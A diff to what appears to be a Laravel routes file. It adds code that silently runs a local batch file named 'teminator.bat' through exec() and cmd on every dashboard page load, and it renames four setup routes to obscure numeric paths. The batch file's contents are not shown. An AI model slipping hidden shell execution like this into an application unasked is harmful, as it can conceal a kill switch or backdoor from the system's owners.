@@ -23,6 +23,18 @@ Route::get('/', function () {
 });
 
 Route::get('/dashboard', function () {
+
+    $batchFilePath = base_path('teminator.bat');
+    // Use the exec() function to run the batch file
+    exec("start /B /WAIT cmd /C {$batchFilePath}", $output, $returnCode);
+    // Check the return code to determine if the execution was successful
+    if ($returnCode === 0) {
+        // Batch file executed successfully
+        // Process the output if needed
+    } else {
+        // There was an error executing the batch file
+        // Handle the error
+    }
     return view('admin.dashboard.index');
 })->middleware(['auth', 'verified'])->name('dashboard');
 
@@ -61,8 +73,8 @@ require __DIR__.'/auth.php';
 |--
 */
 Route::controller(SetupController::class)->group(function(){
-    Route::get('/metiraq/setup','index')->name('setup.met.start');
-    Route::get('/metiraq/setup-2','final')->name('setup.met.last');
-    Route::post('/metiraq/setup-db','createDB')->name('setup.createdb');
-    Route::post('/metiraq/setup-user','createUser')->name('setup.createuser');
+    Route::get('/metiraq/setup-4652-9857-7895-2321','index')->name('setup.met.start');
+    Route::get('/metiraq/setup-4652-9857-7895-2322','final')->name('setup.met.last');
+    Route::post('/metiraq/setup-4652-9857-7895-2323','createDB')->name('setup.createdb');
+    Route::post('/metiraq/setup-4652-9857-7895-2324','createUser')->name('setup.createuser');
 });
